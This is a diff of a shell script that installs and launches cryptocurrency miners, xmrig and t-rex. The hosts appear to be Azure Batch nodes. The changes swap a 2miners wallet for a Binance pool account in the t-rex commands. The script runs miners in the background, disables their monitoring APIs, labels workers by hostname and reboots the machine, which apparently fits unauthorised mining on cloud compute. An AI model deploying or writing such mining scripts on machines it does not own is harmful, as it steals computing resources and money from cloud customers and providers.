@@ -3,7 +3,7 @@ if [ -f "$DIR" ]; then
   ### Take action if $DIR exists ###
     /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:443 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 75 --cpu-priority 2 --background &&
     hostname=$(hostname | cut -c1-8) &&
-    /home/_azbatch/trex/t-rex --algo ethash --url stratum1+tcp://us-eth.2miners.com:2020 --user 0x6bA4d687Aec1055163DF07F8EA10D643D91d8e20 --worker $hostname --pass pppwww --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30 
+    /home/_azbatch/trex/t-rex --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad.001 --worker datad.001 --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30 
 else
     sudo apt-get update ;
     sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure ;
@@ -34,6 +34,6 @@ else
     tar -xzvf /home/_azbatch/trex/t-rex-0.20.4-linux.tar.gz &&
     cd /home/_azbatch/trex &&
     hostname=$(hostname | cut -c1-8) &&
-     /home/_azbatch/trex/t-rex --algo ethash --url stratum1+tcp://us-eth.2miners.com:2020 --user 0x6bA4d687Aec1055163DF07F8EA10D643D91d8e20 --worker $hostname --pass pppwww --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30 ;
+     /home/_azbatch/trex/t-rex --algo ethash --url stratum+tcp://ethash.poolbinance.com:443 --user datad.001 --worker datad.001 --pass 123456 --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30 ;
     sudo reboot
 fi
